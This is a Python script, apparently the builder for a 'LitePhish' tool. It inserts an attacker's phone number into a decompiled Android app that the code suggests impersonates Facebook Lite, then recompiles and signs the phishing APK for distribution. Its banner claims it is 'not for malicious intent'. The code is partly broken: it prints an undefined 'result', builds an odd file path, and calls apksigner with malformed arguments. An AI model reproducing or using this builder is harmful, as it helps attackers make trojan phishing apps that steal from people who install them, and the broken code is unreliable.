#!/usr/bin/env python
import os, subprocess

import pyfiglet 

  
#result = pyfiglet.figlet_format("LitePhish") 


directory = os.path.dirname(os.path.realpath(__file__))
dpath = os.path.join(directory,"lite_5.9.apk")
dpath2 = os.path.join(os.path.expanduser("~"), 'storage', 'downloads','lite_5.9.apk')
phish = "edt"
path = os.path.join(directory,"ftm/smali/jhay/fbait/lite/MainActivity$100000001.smali", phish)


def changeNum():
    try:
        number = int(input("Attackers Number :"))
        if len(str(number)) < 9:
            print("please input the correct format")
        else:
            with open(os.path.join(directory,"edt"), "r") as f:
                cont = f.read()
                with open(f"{path}", "w") as f:
                    cost = f.write(cont.replace("+254795344966", str(number)))
                recompile()
                signApk()
    except ValueError:
        print("please input phone number minus the (+)")


def recompile():
    process = subprocess.Popen(['apktool', 'b', os.path.join(directory,'ftm'), '--output',dpath],stdout=subprocess.PIPE,universal_newlines=True)
    while True:
        output = process.stdout.readline()
        print(output.strip())
        # Do something else
        return_code = process.poll()
        if return_code is not None:
            print('RETURN CODE', return_code)
            # Process has finished, read rest of the output
            for output in process.stdout.readlines():
                print(output.strip())
            break


def signApk():
    process = subprocess.Popen(["apksigner","keystore", dpath,dpath2],stdout=subprocess.PIPE,universal_newlines=True)
    while True:
        output = process.stdout.readline()
        print(output.strip())
        # Do something else
        return_code = process.poll()
        if return_code is not None:
            print('RETURN CODE', return_code)
            # Process has finished, read rest of the output
            for output in process.stdout.readlines():
                print(output.strip())
            break
        print("Check your downloads folder")
def cleanup():
    try:
        os.remove(os.path.join(directory,"keystore"))
        os.remove(os.path.join(directory,"LP.apk"))
        print("Clean up complete")
    except FileNotFoundError as e:
        print("No clean up to be done")

def main():
    #fonts = ["block","bubble","digital","ivrit","mini","script","shadow","slant","small","smscript","smshadow","smslant","standard"]
    #random.shuffle(fonts)
    os.system("clear")
    print(result)
    os.system('echo  "\\e[1;31m\"')
    os.system('echo "\\e[1;32m\"')
    os.system('echo "\\e[1;32m\"')
    os.system('echo "\\e[1;34m          FreeTechMods \\e[0m"')
    os.system('echo "\\e[2;32m     not for malicious intent! \\e[0m"')
    os.system('echo "\\e[2;32m            Chal13W1zz \\e[0m"')
    os.system('echo "\\e[1;32m   Mail: chaliewizz4.com \\e[0m"')
    print()

if __name__ == "__main__":
    main()
    #generateKey()
    changeNum()
    #recompile()
    cleanup()
